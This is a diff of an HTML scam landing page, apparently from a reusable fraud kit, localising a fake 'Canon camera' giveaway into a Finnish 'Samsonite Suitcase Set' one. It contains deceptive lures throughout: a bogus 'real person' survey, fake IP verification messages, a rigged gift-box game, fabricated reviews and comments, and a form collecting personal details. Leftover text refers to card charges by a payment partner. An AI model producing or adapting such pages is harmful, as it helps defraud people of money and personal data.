@@ -7,86 +7,119 @@
   <meta name="apple-mobile-web-app-capable" content="yes">
   <meta name="robots" content="noindex, follow">
   <meta name="viewport" content="width=device-width,initial-scale=1">
-  <title>Congratulations!</title>
+  <title>ONNITTELUT!</title>
   <meta name="theme-color" content="#0096e7">
-  <link rel="icon" type="image/gif" href="assets/favicon.ico">
+  <link rel="icon" type="image/gif" href="assets/favicon.png">
   <link rel="stylesheet" href="assets/slick.min.css">
   <link rel="stylesheet" href="assets/bootstrap.min.css">
-  <link rel="stylesheet" href="assets/style.min.css">
   <link rel="stylesheet" href="assets/fonts.css">
+  <link rel="stylesheet" href="assets/style.min.css">
+  <style>
+    :root {
+      --header-color: #ffffff;
+      --header-bot-color: #f2f2f2;
+      --btn-color: #27251f;
+      --custom-fonts: 'MacysSans', sans-serif;
+      --text-color: #27251f
+    }
+
+    .menu-top {
+      width: 158px;
+      height: auto;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      background-color: transparent
+    }
+
+    .menu-top img {
+      width: 100%;
+      height: 100%;
+      object-fit: contain
+    }
+
+    .header_flex_item {
+      color: #111
+    }
+
+    body,
+    html {
+      font-size: 14px;
+      color: var(--text-color)
+    }
+
+    .content {
+      background-color: #ffffff
+    }
+
+    body.with_background {
+      background: url('')
+    }
+
+    @media (max-width:800px) {
+      body.with_background {
+        background: url('')
+      }
+    }
+
+    .text-primary {
+      color: #bc2633
+    }
+
+    .top-header {
+      background-color: var(--header-color)
+    }
+  </style>
   <link rel="stylesheet" href="assets/sur.min.css">
   <link rel="stylesheet" href="assets/index.css">
-  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
   {snippet:jquery_cdn}
   <script src="assets/bootstrap.min.js"></script>
   <script>
     let settingModal = { backdrop: 'static', keyboard: false };
-    let productName = 'Canon Camera';
+    let productName = 'Samsonite Set';
   </script>
 </head>
 
 <body>
-{snippet:common_js_no_depth_snippet}{snippet:fbpixel}
+{snippet:fbpixel}
+{snippet:common_js_no_depth_snippet}
 <div id="p_loading" style="display:none">
   <div class="d-flex justify-content-center" style="margin:0 auto">
     <div class="spinner-border" role="status"><span class="sr-only">Loading...</span></div>
   </div>
 </div>
 <div id="p_body_content">
-  <div class="header_bcg" id="top-header">
-    <div class="the_header">
-      <div class="header--container header--top_container">
-        <div class="header_top flex">
-          <div class="header_top--logo_container logo_container flex">
-            <div class="logo header--logo">
-              <img class="logo--img" src="assets/logo.webp" alt="">
-            </div>
-          </div>
-          <div class="header_top--nav the_nav flex lg_item">
-            <div class="header_top--link nav--link flex">Consumer</div>
-            <div class="header_top--link nav--link flex">Business</div>
-            <div class="header_top--link nav--link flex">Pro Photo & Video</div>
-          </div>
-          <div class="header_top--icons icons flex">
-            <div class="header_top--icons--element icons--element icons--element_row flex">
-              <div class="icons--icon_container flex">
-                <img class="icons--icon" src="assets/i1.webp" alt="">
-              </div>
-              <span class="icons--text lg_item">Search _</span>
-            </div>
-            <div class="icons--divider lg_item"></div>
-            <div class="icons--element lg_item flex">
-              <div class="icons--icon_container flex">
-                <img class="icons--icon icons--hover" src="assets/i2.webp" alt="">
-                <img class="icons--icon icons--hover_hidden" src="assets/i22.webp" alt="">
-              </div>
-            </div>
-            <div class="icons--divider"></div>
-            <div class="icons--element flex">
-              <div class="icons--icon_container flex">
-                <img class="icons--icon icons--hover" src="assets/i3.webp" alt="">
-                <img class="icons--icon icons--hover_hidden" src="assets/i33.webp" alt="">
-              </div>
-            </div>
-          </div>
-          <div class="burger md_item flex">
-            <div class="burger--wrapper">
-              <!-- <i class="fa-solid fa-bars burger--icon"></i> -->
-              <img class="burger--img" src="assets/burger.webp" alt="">
-            </div>
-          </div>
+  <div class="top-header_container">
+    <div class="top-header" id="top-header">
+      <div class="header__nav">
+        <div class="header__item-img burger">
+          <img src="assets/burger-icon.svg" alt="">
+        </div>
+        <div class="menu-top logo_desktop">
+          <img src="assets/menu-top.svg" alt="">
         </div>
       </div>
-      <div class="header--container header--bot_container lg_item">
-        <div class="header_bot flex">
-          <div class="header_bot--nav the_nav flex">
-            <div class="header_bot--link nav--link flex">PRODUCTS</div>
-            <div class="header_bot--link nav--link flex">APPS & SOFTWARE</div>
-            <div class="header_bot--link nav--link flex">GET INSPIRED</div>
-            <div class="header_bot--link nav--link flex">NEWS & EVENTS</div>
-            <div class="header_bot--link nav--link flex">SUPPORT</div>
-            <div class="header_bot--link nav--link">OFFICIAL STORE</div>
-          </div>
+      <div class="header__nav logo_mobile" style="display: none;">
+        <div class="menu-top">
+          <img src="assets/menu-top.svg" alt="">
+        </div>
+      </div>
+      <div class="header__nav-menu">
+        <a href="#" class="header__link">MATKATAVARAT</a>
+        <a href="#" class="header__link">LAUKUT</a>
+        <a href="#" class="header__link">LISÄTARVIKKEET</a>
+        <a href="#" class="header__link">MYYNTI</a>
+        <a href="#" class="header__link">LÖYDÄ</a>
+      </div>
+      <div class="header__nav nav_right" style="gap: 0;">
+        <div class="header__item-img">
+          <img src="assets/search.webp" alt="">
+        </div>
+        <div class="header__item-img">
+          <img src="assets/login.webp" alt="">
+        </div>
+        <div class="header__item-img">
+          <img src="assets/bag.webp" alt="">
         </div>
       </div>
     </div>
@@ -94,8 +127,8 @@
   <div class="content">
     <div class="all-content-wrapper">
       <div class="main-content flags home-step" id="content1">
-        <h2 style="font-weight:300">Congratulations!</h2>
-        <p>You have been selected to participate in the Canon campaign. You could win a Canon camera!</p>
+        <h2 style="font-weight:300">ONNITTELUT!</h2>
+        <p>Sinut on valittu osallistumaan Samsonite-kampanjaan. Voit voittaa Samsonite Suitcase Set!</p>
         <div class="caja_premio" style="max-width:100%;margin:0 auto">
           <style>
             .principal_bg {
@@ -105,51 +138,54 @@
           <div class="slider-wrapper-start"
                style="max-width:500px;margin:30px auto;display:block;width:100%;cursor:pointer">
             <div class="intro-img">
-              <div style="margin-top:15px;padding-bottom:7px" class="intro-img__btn-none buttons_showHidden">
-                <button class="active" data-step="0"><img src="assets/3.webp" class="img-fluid" alt=""><span></span>
-                </button>
-                <button data-step="1"><img src="assets/set2.webp" class="img-fluid" alt=""><span></span></button>
-                <button data-step="2"><img src="assets/set3.webp" class="img-fluid" alt=""><span></span></button>
-              </div>
+              <div style="margin-top:15px;padding-bottom:7px" class="intro-img__btn-none buttons_showHidden"><button
+                class="active" data-step="0"><img src="assets/3.webp" class="img-fluid" alt=""><span>Metallic
+                      Teal</span></button> <button data-step="1"><img src="assets/set2.webp" class="img-fluid"
+                                                                      alt=""><span>Blade Silver</span></button> <button data-step="2"><img src="assets/set3.webp"
+                                                                                                                                           class="img-fluid" alt=""><span>Rose
+                      Gold</span></button></div>
               <div class="intro-img__img intro-img__img-start images_showHidden"><img src="assets/3.webp" alt=""
                                                                                       class="active" data-step="0"><img src="assets/set2.webp" alt="" data-step="1"><img
                 src="assets/set3.webp" alt="" data-step="2"></div>
             </div>
           </div>
         </div>
-        <p>If you want a Canon camera, you'll need to fill out a survey to confirm you're a real person.</p>
-        <p>Be quick, the number of prizes is limited!</p>
+        <p>Valitsemme 10 satunnaista käyttäjää, joille
+          annamme mahdollisuuden voittaa upeita palkintoja. Tämän päivän palkinto on Samsonite Suitcase Set! Arvomme
+          10
+          onnekasta
+          voittajaa.</p>
+        <p>Toimi nopeasti, palkintoja on rajoitettu määrä!</p>
         <div class="main-content flags" id="content1">
           <div id="q1">
-            <p class="question"><strong>Question 1 of 3:</strong>&nbsp;<span>Are you from Great Britain?</span>
+            <p class="question"><strong>Kysymys 1/3:</strong>&nbsp;<span>Oletko Suomesta?</span>
             </p>
-            <div class="survey_button bq1" data-depth="depth" data-bq="1">YES</div>
-            <div class="survey_button bq1" data-depth="depth" data-bq="2">NO</div>
+            <div class="survey_button bq1" data-depth="depth" data-bq="1">KYLLÄ</div>
+            <div class="survey_button bq1" data-depth="depth" data-bq="2">EI</div>
           </div>
           <div id="q2">
-            <p class="question"><strong>Question 2 of 3:</strong>&nbsp;<span>Have you bought anything of Canon?</span>
-            </p>
-            <div class="survey_button bq2" data-depth="depth" data-bq="1">YES</div>
-            <div class="survey_button bq2" data-depth="depth" data-bq="2">NO</div>
+            <p class="question"><strong>Kysymys 2/3:</strong>&nbsp;<span>Ostitko mitään Samsonite?</span></p>
+            <div class="survey_button bq2" data-depth="depth" data-bq="1">KYLLÄ</div>
+            <div class="survey_button bq2" data-depth="depth" data-bq="2">EI</div>
           </div>
           <div id="q3">
-            <p class="question"><strong>Question 3 of 3:</strong>&nbsp;<span>Do you want to participate in the raffle
-                  for a Canon camera?</span>
+            <p class="question"><strong>Kysymys 3/3:</strong>&nbsp;<span>Haluatko osallistua Samsonite-laukkusarjan
+                  arvontaan?</span>
             </p>
-            <div class="survey_button bq3" data-depth="depth" data-bq="3">YES</div>
-            <div class="survey_button bq3" data-depth="depth" data-bq="4">NO</div>
+            <div class="survey_button bq3" data-depth="depth" data-bq="1">KYLLÄ</div>
+            <div class="survey_button bq3" data-depth="depth" data-bq="2">EI</div>
           </div>
         </div>
         <link rel="stylesheet" href="assets/survey.min.css">
       </div>
       <div class="main-content" id="content2">
-        <h2 style="text-align:center">Your answers are being checked...</h2>
+        <h2 style="text-align:center">Tarkistamme vastauksiasi...</h2>
         <div class="d-flex justify-content-center">
           <div class="spinner-border m-3" role="status"><span class="sr-only">Loading...</span></div>
         </div>
-        <p class="result" id="result1">You answered 3/3 of the questions!</p>
-        <p class="result" id="result2">There are no preliminary investigations into your IP</p>
-        <p class="result" id="result3">Gifts are loaded...</p>
+        <p class="result" id="result1">Vastasit kaikkiin 3 kysymykseen</p>
+        <p class="result" id="result2">IP-osoitteellesi ei ole olemassa muita tutkimuksia</p>
+        <p class="result" id="result3">Palkintoja ladataan...</p>
       </div>
       <div class="main-content" id="content3">
         <link rel="stylesheet" href="assets/box.min.css">
@@ -176,121 +212,122 @@
           <div id="0" class="try temblor">
             <div class="caja_tapa"><img data-depth="depth" data-eventlock="lock" alt="" class="box-01"
                                         src="assets/32.webp"></div>
-            <div class="caja_trasera"><img alt="" class="box-03" src="assets/33.webp">
-            </div>
+            <div class="caja_trasera"><img alt="" class="box-03" src="assets/33.webp"></div>
             <div class="caja_gift"><img alt="" class="box-04" src="assets/34.webp">
             </div>
-            <div class="caja"><img alt="" class="box-02" src="assets/35.webp"></div>
+            <div class="caja"><img alt="" class="box-02" src="assets/35.webp">
+            </div>
           </div>
           <div id="1" class="try temblor">
             <div class="caja_tapa"><img data-depth="depth" data-eventlock="lock" alt="" class="box-01"
                                         src="assets/32.webp"></div>
-            <div class="caja_trasera"><img alt="" class="box-03" src="assets/33.webp">
-            </div>
+            <div class="caja_trasera"><img alt="" class="box-03" src="assets/33.webp"></div>
             <div class="caja_gift"><img alt="" class="box-04" src="assets/34.webp">
             </div>
-            <div class="caja"><img alt="" class="box-02" src="assets/35.webp"></div>
+            <div class="caja"><img alt="" class="box-02" src="assets/35.webp">
+            </div>
           </div>
           <div id="2" class="try temblor">
             <div class="caja_tapa"><img data-depth="depth" data-eventlock="lock" alt="" class="box-01"
                                         src="assets/32.webp"></div>
-            <div class="caja_trasera"><img alt="" class="box-03" src="assets/33.webp">
-            </div>
+            <div class="caja_trasera"><img alt="" class="box-03" src="assets/33.webp"></div>
             <div class="caja_gift"><img alt="" class="box-04" src="assets/34.webp">
             </div>
-            <div class="caja"><img alt="" class="box-02" src="assets/35.webp"></div>
+            <div class="caja"><img alt="" class="box-02" src="assets/35.webp">
+            </div>
           </div>
           <div id="3" class="try temblor">
             <div class="caja_tapa"><img data-depth="depth" data-eventlock="lock" alt="" class="box-01"
                                         src="assets/32.webp"></div>
-            <div class="caja_trasera"><img alt="" class="box-03" src="assets/33.webp">
-            </div>
+            <div class="caja_trasera"><img alt="" class="box-03" src="assets/33.webp"></div>
             <div class="caja_gift"><img alt="" class="box-04" src="assets/34.webp">
             </div>
-            <div class="caja"><img alt="" class="box-02" src="assets/35.webp"></div>
+            <div class="caja"><img alt="" class="box-02" src="assets/35.webp">
+            </div>
           </div>
           <div id="4" class="try temblor">
             <div class="caja_tapa"><img data-depth="depth" data-eventlock="lock" alt="" class="box-01"
                                         src="assets/32.webp"></div>
-            <div class="caja_trasera"><img alt="" class="box-03" src="assets/33.webp">
-            </div>
+            <div class="caja_trasera"><img alt="" class="box-03" src="assets/33.webp"></div>
             <div class="caja_gift"><img alt="" class="box-04" src="assets/34.webp">
             </div>
-            <div class="caja"><img alt="" class="box-02" src="assets/35.webp"></div>
+            <div class="caja"><img alt="" class="box-02" src="assets/35.webp">
+            </div>
           </div>
           <div id="5" class="try temblor">
             <div class="caja_tapa"><img data-depth="depth" data-eventlock="lock" alt="" class="box-01"
                                         src="assets/32.webp"></div>
-            <div class="caja_trasera"><img alt="" class="box-03" src="assets/33.webp">
-            </div>
+            <div class="caja_trasera"><img alt="" class="box-03" src="assets/33.webp"></div>
             <div class="caja_gift"><img alt="" class="box-04" src="assets/34.webp">
             </div>
-            <div class="caja"><img alt="" class="box-02" src="assets/35.webp"></div>
+            <div class="caja"><img alt="" class="box-02" src="assets/35.webp">
+            </div>
           </div>
           <div id="6" class="try temblor">
             <div class="caja_tapa"><img data-depth="depth" data-eventlock="lock" alt="" class="box-01"
                                         src="assets/32.webp"></div>
-            <div class="caja_trasera"><img alt="" class="box-03" src="assets/33.webp">
-            </div>
+            <div class="caja_trasera"><img alt="" class="box-03" src="assets/33.webp"></div>
             <div class="caja_gift"><img alt="" class="box-04" src="assets/34.webp">
             </div>
-            <div class="caja"><img alt="" class="box-02" src="assets/35.webp"></div>
+            <div class="caja"><img alt="" class="box-02" src="assets/35.webp">
+            </div>
           </div>
           <div id="7" class="try temblor">
             <div class="caja_tapa"><img data-depth="depth" data-eventlock="lock" alt="" class="box-01"
                                         src="assets/32.webp"></div>
-            <div class="caja_trasera"><img alt="" class="box-03" src="assets/33.webp">
-            </div>
+            <div class="caja_trasera"><img alt="" class="box-03" src="assets/33.webp"></div>
             <div class="caja_gift"><img alt="" class="box-04" src="assets/34.webp">
             </div>
-            <div class="caja"><img alt="" class="box-02" src="assets/35.webp"></div>
+            <div class="caja"><img alt="" class="box-02" src="assets/35.webp">
+            </div>
           </div>
           <div id="8" class="try temblor">
             <div class="caja_tapa"><img data-depth="depth" data-eventlock="lock" alt="" class="box-01"
                                         src="assets/32.webp"></div>
-            <div class="caja_trasera"><img alt="" class="box-03" src="assets/33.webp">
-            </div>
+            <div class="caja_trasera"><img alt="" class="box-03" src="assets/33.webp"></div>
             <div class="caja_gift"><img alt="" class="box-04" src="assets/34.webp">
             </div>
-            <div class="caja"><img alt="" class="box-02" src="assets/35.webp"></div>
+            <div class="caja"><img alt="" class="box-02" src="assets/35.webp">
+            </div>
           </div>
           <div id="9" class="try temblor">
             <div class="caja_tapa"><img data-depth="depth" data-eventlock="lock" alt="" class="box-01"
                                         src="assets/32.webp"></div>
-            <div class="caja_trasera"><img alt="" class="box-03" src="assets/33.webp">
-            </div>
+            <div class="caja_trasera"><img alt="" class="box-03" src="assets/33.webp"></div>
             <div class="caja_gift"><img alt="" class="box-04" src="assets/34.webp">
             </div>
-            <div class="caja"><img alt="" class="box-02" src="assets/35.webp"></div>
+            <div class="caja"><img alt="" class="box-02" src="assets/35.webp">
+            </div>
           </div>
           <div id="10" class="try temblor">
             <div class="caja_tapa"><img data-depth="depth" data-eventlock="lock" alt="" class="box-01"
                                         src="assets/32.webp"></div>
-            <div class="caja_trasera"><img alt="" class="box-03" src="assets/33.webp">
-            </div>
+            <div class="caja_trasera"><img alt="" class="box-03" src="assets/33.webp"></div>
             <div class="caja_gift"><img alt="" class="box-04" src="assets/34.webp">
             </div>
-            <div class="caja"><img alt="" class="box-02" src="assets/35.webp"></div>
+            <div class="caja"><img alt="" class="box-02" src="assets/35.webp">
+            </div>
           </div>
           <div id="11" class="try temblor">
             <div class="caja_tapa"><img data-depth="depth" data-eventlock="lock" alt="" class="box-01"
                                         src="assets/32.webp"></div>
-            <div class="caja_trasera"><img alt="" class="box-03" src="assets/33.webp">
-            </div>
+            <div class="caja_trasera"><img alt="" class="box-03" src="assets/33.webp"></div>
             <div class="caja_gift"><img alt="" class="box-04" src="assets/34.webp">
             </div>
-            <div class="caja"><img alt="" class="box-02" src="assets/35.webp"></div>
+            <div class="caja"><img alt="" class="box-02" src="assets/35.webp">
+            </div>
           </div>
         </div>
         <div id="p_modal1" class="modal fade text-center p_modal" tabindex="-1" role="dialog" aria-hidden="true">
           <div class="modal-dialog" role="document">
             <div class="modal-content">
               <div class="modal-body"><img alt="" class="temblor_inf box-00" src="assets/31.webp">
-                <h2>Congratulations, you have successfully verified that you are a real person.</h2>
-                <p>Today you have the opportunity to get Canon camera!</p>
-                <button type="button" id="p_modal_button1" class="btn btn-success btn-lg"
-                        style="background-color:var(--btn-color);border-color:var(--btn-color)">OK
-                </button>
+                <h2>Onnittelut, olet todennut onnistuneesti olevasi oikea henkilö.</h2>
+                <p>Tänään sinulla on mahdollisuus saada Samsonite Suitcase Set!</p>
+                <p>Valitse vain oikea lahjarasia.</p>
+                <p>Sinulla on 3 yritystä, onnea matkaan!</p>
+                <p>Kokeile onneasi!</p><button type="button" id="p_modal_button1" class="btn btn-success btn-lg"
+                                               style="background-color:var(--btn-color);border-color:var(--btn-color)">OK</button>
               </div>
             </div>
           </div>
@@ -303,10 +340,9 @@
                   <div class="checkmark draw"></div>
                 </div>
                 <h2>OHHH…</h2>
-                <p>Sorry, this gift box is empty! But you can try again two more times. Good luck! </p>
-                <button type="button" id="p_modal_button2" class="btn btn-success btn-lg"
-                        style="background-color:var(--btn-color);border-color:var(--btn-color)">OK
-                </button>
+                <p>Sinulla on ylimääräinen vuoro!</p><button type="button" id="p_modal_button2"
+                                                             class="btn btn-success btn-lg"
+                                                             style="background-color:var(--btn-color);border-color:var(--btn-color)">OK</button>
               </div>
             </div>
           </div>
@@ -315,13 +351,14 @@
           <div class="modal-dialog" role="document">
             <div class="modal-content">
               <div class="modal-body"><img alt="" class="box-gift" src="assets/3.webp">
-                <h2>Congratulations! You won!</h2>
-                <p>1) Click "Apply Now".</p>
-                <p>2) Complete the form and pay for delivery.</p>
-                <p>3) The package will be delivered within 5-7 days.</p>
+                <h2>ONNITTELUT!</h2>
+                <p>Onnittelut! Voitit palkinnon Samsonite Suitcase Set!</p>
+                <p>***SÄÄNNÖT***</p>
+                <p>1. Napsauta "OK" täyttääksesi tietosi kassalla.</p>
+                <p>2. Anna osoitteesi saadaksesi tuotteen Samsonite Suitcase Set.</p>
+                <p>3. Tuote Samsonite Suitcase Set toimitetaan 5–7 päivän kuluessa</p>
                 <button id="p_modal_button3" class="btn btn-success btn-lg"
-                        style="background-color:var(--btn-color);border-color:var(--btn-color);color:#fff">Apply
-                  now</button>
+                        style="background-color:var(--btn-color);border-color:var(--btn-color);color:#fff">Hae nyt</button>
               </div>
             </div>
           </div>
@@ -333,25 +370,29 @@
             <div class="row justify-content-between align-items-center">
               <div class="col-12 col-xl-8">
                 <div class="intro-offer">
-                  <div class="intro-offer__name">Canon Camera</div>
+                  <div class="intro-offer__name">Walmart Samsonite Set</div>
                   <div class="intro-offer__review"><i class="fas fa-star"></i><i class="fas fa-star"></i><i
                     class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i><span>5.0 (12
-                        reviews)</span></div>
+                        recensioni)</span></div>
                 </div>
                 <div class="intro-img">
-                  <div style="padding-bottom:7px;margin-bottom:15px" class="intro-img__btn buttons_showHidden">
-                    <button class="active" data-step="0"><img src="assets/3.webp" class="img-fluid"
-                                                              alt=""><span></span></button>
-                    <button data-step="1"><img src="assets/set2.webp" class="img-fluid" alt=""><span></span></button>
-                    <button data-step="2"><img src="assets/set3.webp" class="img-fluid" alt=""><span></span></button>
+                  <div style="padding-bottom:7px;margin-bottom:15px" class="intro-img__btn buttons_showHidden"><button
+                    class="active" data-step="0"><img src="assets/3.webp" class="img-fluid" alt=""><span>Metallic
+                          Teal</span></button>
+                    <button data-step="1"><img src="assets/set2.webp" class="img-fluid" alt=""><span>Blade
+                          Silver</span></button> <button data-step="2"><img src="assets/set3.webp" class="img-fluid"
+                                                                            alt=""><span>Rose
+                          Gold</span></button>
                   </div>
                   <div class="intro-img__img intro-img__img-end images_showHidden"><img src="assets/3.webp" alt=""
                                                                                         class="active" data-step="0"><img src="assets/set2.webp" alt="" data-step="1"><img
                     src="assets/set3.webp" alt="" data-step="2"></div>
                   <div class="intro-img__title" style="display:none">
-                    <h2 class="active" data-step="0">Canon Camera</h2>
-                    <h2 data-step="1">Canon Camera</h2>
-                    <h2 data-step="2">Canon Camera</h2>
+                    <h2 class="active" data-step="0">Uptempo 2-Pc. Hardside Luggage Set, Metallic Teal</h2>
+                    <h2 data-step="1">Uptempo 2-Pc. Hardside Luggage Set,
+                      Blade Silver</h2>
+                    <h2 data-step="2">Uptempo 2-Pc. Hardside Luggage Set,
+                      Rose Gold</h2>
                   </div>
                 </div>
               </div>
@@ -361,75 +402,69 @@
                     <form class="new-form" id="userDataForm" action="" method="POST">
                       <div class="form-block" data-step="0" style="display:block">
                         <div class="input-wrapper StepForm">
-                          <p class="form-title">Please enter your information</p>
+                          <p class="form-title">Syötä tietosi</p>
                           <div class="form-block__half m-0">
-                            <div id="firstnameWrapper" class="form-block__full"><i class="far fa-check-circle"></i>
-                              <input data-depth="depth" data-validate="name" class="w100" placeholder="First name"
-                                     id="firstname" name="fname" autocomplete="given-name"> <span
-                                class="placeholder firstname">First name</span>
+                            <div id="firstnameWrapper" class="form-block__full"><i
+                              class="far fa-check-circle"></i><input data-depth="depth" data-validate="name"
+                                                                     class="w100" placeholder="First name" id="firstname" name="fname"
+                                                                     autocomplete="given-name"><span class="placeholder firstname">Etunimi</span>
                             </div>
-                            <div id="firstnameInvalid" class="invalidField">* First name is invalid (ex. Vincent)
+                            <div id="firstnameInvalid" class="invalidField">* Etunimi on virheellinen (esim. Vincent).
                             </div>
                           </div>
                           <div class="form-block__half m-0">
-                            <div id="lastnameWrapper" class="form-block__full"><i class="far fa-check-circle"></i>
-                              <input data-validate="name" class="w100" placeholder="Last name" id="lastname"
-                                     name="lname" autocomplete="family-name"> <span class="placeholder lastname">Last
-                                  name</span></div>
-                            <div id="lastnameInvalid" class="invalidField">* The name of family is not valid (ex.
-                              Lambert)</div>
+                            <div id="lastnameWrapper" class="form-block__full"><i
+                              class="far fa-check-circle"></i><input data-validate="name" class="w100"
+                                                                     placeholder="Last name" id="lastname" name="lname" autocomplete="family-name"><span
+                              class="placeholder lastname">Sukunimi</span></div>
+                            <div id="lastnameInvalid" class="invalidField">* Perheen nimi ei ole kelvollinen (esim.
+                              Lambert).</div>
                           </div>
-                          <div id="addressWrapper" class="form-block__full"><i class="far fa-check-circle"></i> <input
+                          <div id="addressWrapper" class="form-block__full"><i class="far fa-check-circle"></i><input
                             data-validate="address" class="w100" placeholder="Address" id="address" name="address"
-                            autocomplete="street-address">
-                            <span class="placeholder address">Address</span>
+                            autocomplete="street-address"><span class="placeholder address">Osoite</span></div>
+                          <div class="form-block__half m-0">
+                            <div id="zipcodeWrapper" class="form-block__full"><i
+                              class="far fa-check-circle"></i><input data-validate="zip" class="w100"
+                                                                     placeholder="ZIP" id="zipcode" name="zip" autocomplete="postal-code"><span
+                              class="placeholder zipcode">Postinumero</span></div>
                           </div>
                           <div class="form-block__half m-0">
-                            <div id="zipcodeWrapper" class="form-block__full"><i class="far fa-check-circle"></i>
-                              <input data-validate="zip" class="w100" placeholder="ZIP" id="zipcode" name="zip"
-                                     autocomplete="postal-code">
-                              <span class="placeholder zipcode">Postal code</span>
-                            </div>
-                          </div>
-                          <div class="form-block__half m-0">
-                            <div id="cityWrapper" class="form-block__full"><i class="far fa-check-circle"></i> <input
+                            <div id="cityWrapper" class="form-block__full"><i class="far fa-check-circle"></i><input
                               data-validate="city" class="w100" placeholder="City" id="city" name="city"
-                              autocomplete="address-level2">
-                              <span class="placeholder city">City</span>
-                            </div>
+                              autocomplete="address-level2"><span class="placeholder city">Kaupunki</span></div>
                           </div>
-                          <div id="phoneWrapper" class="form-block__full focused"><i class="far fa-check-circle"></i>
-                            <input data-validate="phone" class="w100" placeholder="Phone" id="phone" name="phone"
-                                   autocomplete="tel-national">
-                            <span class="placeholder phone">Phone number</span>
+                          <div id="phoneWrapper" class="form-block__full focused"><i
+                            class="far fa-check-circle"></i><input data-validate="phone" class="w100"
+                                                                   placeholder="Phone" id="phone" name="phone" autocomplete="tel-national"><span
+                            class="placeholder phone">Puhelinnumero</span>
                             <div class="plus_number_code">+</div>
                             <div class="flag iti-flag"></div>
                           </div>
-                          <div id="phoneInvalid" class="invalidField">* The phone is not valid (ex. +11234567890)
+                          <div id="phoneInvalid" class="invalidField">* Puhelin ei ole voimassa (esim. +11234567890).
                           </div>
-                          <div id="emailWrapper" class="form-block__full"><i class="far fa-check-circle"></i> <input
+                          <div id="emailWrapper" class="form-block__full"><i class="far fa-check-circle"></i><input
                             data-validate="email" class="w100" placeholder="Email" id="email" name="email"
-                            autocomplete="off"> <span class="placeholder email">Email</span>
+                            autocomplete="off"><span class="placeholder email">e-mail</span>
                             <ul class="email-hint">
-                              <li class="email" data-value="gmail.com">Email</li>
-                              <li class="email" data-value="outlook.com">Email</li>
-                              <li class="email" data-value="live.com">Email</li>
-                              <li class="email" data-value="orange.com">Email</li>
-                              <li class="email" data-value="gmail.com">Email</li>
-                              <li class="email" data-value="hotmail.com">Email</li>
-                              <li class="email" data-value="live.com">Email</li>
-                              <li class="email" data-value="sfr.com">Email</li>
-                              <li class="email" data-value="yahoo.com">Email</li>
-                              <li class="email" data-value="gmx.com">Email</li>
-                              <li class="email" data-value="wanadoo.com">Email</li>
-                              <li class="email" data-value="neuf.com">Email</li>
-                              <li class="email" data-value="free.com">Email</li>
+                              <li class="email" data-value="gmail.com">e-mail</li>
+                              <li class="email" data-value="outlook.com">e-mail</li>
+                              <li class="email" data-value="live.com">e-mail</li>
+                              <li class="email" data-value="orange.com">e-mail</li>
+                              <li class="email" data-value="gmail.com">e-mail</li>
+                              <li class="email" data-value="hotmail.com">e-mail</li>
+                              <li class="email" data-value="live.com">e-mail</li>
+                              <li class="email" data-value="sfr.com">e-mail</li>
+                              <li class="email" data-value="yahoo.com">e-mail</li>
+                              <li class="email" data-value="gmx.com">e-mail</li>
+                              <li class="email" data-value="wanadoo.com">e-mail</li>
+                              <li class="email" data-value="neuf.com">e-mail</li>
+                              <li class="email" data-value="free.com">e-mail</li>
                             </ul>
                           </div>
-                          <div id="emailInvalid" class="invalidField">* Email is invalid (e.g. husband@gmail.com)
-                          </div>
-                          <button data-depth="depth" id="submitForm" type="submit" class="info-button"
-                                  data-call="_generateFullName" data-next="1">Continue</button>
+                          <div id="emailInvalid" class="invalidField">* Sähköpostiosoite on virheellinen (esim.
+                            husband@gmail.com).</div><button data-depth="depth" id="submitForm" type="submit"
+                                                             class="info-button" data-call="_generateFullName" data-next="1">Continuer</button>
                         </div>
                       </div>
                     </form>
@@ -438,14 +473,12 @@
                         <h5 class="title-4 pt-40">Error</h5>
                       </div>
                       <div>
-                        <p class="spec">Unfortunately, an error occurred during the
-                          process.</p>
-                        <p class="desc">Please ensure that the provided information is
-                          correct
-                          or try another credit card.</p>
-                        <p class="desc"><a href="#" class="toForm">Click here to try
-                          again</a>
+                        <p class="spec">Unfortunately, an error occurred during the process.
                         </p>
+                        <p class="desc">Please ensure that the provided information is
+                          correct or try another credit card.</p>
+                        <p class="desc"><a href="#" class="toForm">Click here to try
+                          again</a></p>
                       </div>
                     </div>
                     <div class="form-wrap" id="section-success" style="display:none">
@@ -456,13 +489,11 @@
                         <h2 class="spec"><b>ATTENTION!</b></h2>
                         <p class="spec">Note: Your participation has been confirmed.<br>The
                           indicated cost will be charged to your account by our payment
-                          partner
-                          <r class="response_descriptor">ELEG</r>
-                          . If you have any questions, please do not hesitate to contact
-                          our
-                          customer service by email or phone:<br>
-                          <r class="response_descriptor_mail">@sdf.sdf</r>
-                          <br><a href="#" class="response_descriptor_phone">09895656</a><br><br>Please
+                          partner<r class="response_descriptor">ELEG</r>. If you have any
+                          questions, please do not hesitate to contact our customer
+                          service by email or phone:<br>
+                          <r class="response_descriptor_mail">@sdf.sdf</r><br><a href="#"
+                                                                                 class="response_descriptor_phone">09895656</a><br><br>Please
                           make sure to save this information for your convenience.<br>The
                           winner of the prize will be contacted by email.
                         </p>
@@ -479,9 +510,9 @@
         <link rel="stylesheet" href="assets/comments.min.css">
         <div class="comments_face">
           <div class="comments">
-            <p style="margin:0;padding:0;float:left;display:block;width:50%"><span style="color:#3b5998">More
-                  options</span></p>
-            <p style="margin:0;padding:0;float:right;display:block;width:50%;color:#a8a7a7;text-align:right">10 to 80
+            <p style="margin:0;padding:0;float:left;display:block;width:50%"><span style="color:#3b5998">Lisää
+                  vaihtoehtoja</span></p>
+            <p style="margin:0;padding:0;float:right;display:block;width:50%;color:#a8a7a7;text-align:right">10-80
             </p>
             <div style="clear:both"></div>
           </div>
@@ -489,141 +520,137 @@
             <div class="profile"><img src="assets/i-14.webp" style="height:60px"></div>
             <div class="comment-content">
               <p class="name">Sallie Hull</p>
-              <p>Shit I didn’t win anything!</p>
+              <p>Hitto, en voittanut mitään!</p>
             </div>
             <div class="clr"></div>
-            <div class="comment-status"><span>I like it · Comment <img style="margin-top:-7px"
-                                                                       src="assets/fedbba216589a0a40fabb2e0cb24911e663e679e.webp" width="15px"
-                                                                       height="15px">29</span><small>&nbsp;·
-              <u style="margin-left:5px">4 minutes ago</u></small></div>
+            <div class="comment-status"><span>Pidän siitä • Kommentti <img alt="" style="margin-top:-4px"
